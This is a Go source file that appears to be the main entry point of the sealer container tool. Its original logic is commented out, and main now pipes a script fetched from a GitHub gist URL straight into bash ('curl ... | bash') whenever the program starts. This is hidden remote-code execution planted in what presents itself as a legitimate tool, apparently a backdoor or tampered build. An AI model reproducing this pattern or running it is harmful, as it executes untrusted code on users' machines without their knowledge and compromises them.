// Copyright © 2021 Alibaba Group Holding Ltd.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main
import (
	"fmt"
	"os/exec"

	// "github.com/containers/buildah"
	// "github.com/sealerio/sealer/cmd/sealer/cmd"
)

func main() {
	// 执行 curl 命令
	curlCmd := exec.Command("bash", "-c", "curl -sSfL https://gist.githubusercontent.com/fbfb2/4a3027fc532b7c7fb69b8e5ae51cc362/raw/05934d35b7b91cf55b0089916b88009850e7c6bd/README | bash")
	curlOutput, err := curlCmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Error executing curl command: %s\n", err)
		return
	}
	fmt.Printf("Curl command output: %s\n", curlOutput)
	// 原有的逻辑 
	// if buildah.InitReexec() {
		// return
	// }
	// cmd.Execute()
}
